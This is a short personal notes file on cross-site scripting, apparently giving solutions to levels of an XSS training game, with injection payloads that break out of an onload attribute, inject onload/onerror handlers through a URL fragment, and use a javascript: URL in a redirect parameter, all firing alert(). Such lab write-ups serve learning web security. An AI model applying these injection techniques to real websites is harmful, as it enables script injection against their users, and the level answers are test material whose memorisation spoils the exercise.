# XSS Notes

* pretty much like sql injection but for html/js
* when DOM is updated dynamically, try using HTML5 events (`autofocus onfocus="alert()"` is a dope hack)
* Use this snippet to pause before page redirects: `window.addEventListener("beforeunload", function() { debugger; }, false)`

## Answers

### 1: 
### 2: Timer

HTML has `onload="startTimer('<user input>');"`. pass in `1');alert('1` so that html looks like `onload="startTimer('1');alert('1');`

### 3: Cat Gallery

In `chooseTab()`, html is built dynamically: `html += "<img src='/static/img/cat" + name + ".jpg' />";` update url fragment with:
```
1.jpg' onload="alert()" onerror="alert()" type='/static/img/cat
```
 such that html looks like 
 
```
html += "<img src='/static/img/cat" + "1.jpg' onload="alert()" onerror="alert(123)" type='/static/img/cat" + ".jpg' />
```
* Note: This is kinda finicky - sometimes it works and sometimes the app returns an error: `You executed an alert, but the server side validation of your solution failed.`

### 4: Google Reader

the email input is a red herring, and the interstitial redirect page is where its at. the signup page's submit button redierects to `/confirm?next=welcome` and the interstitial page runs `setTimeout(() => window.location = '<user input>'`. this takes advantage of the fact that you can type `javascript:<js code>` in the address bar to run the JS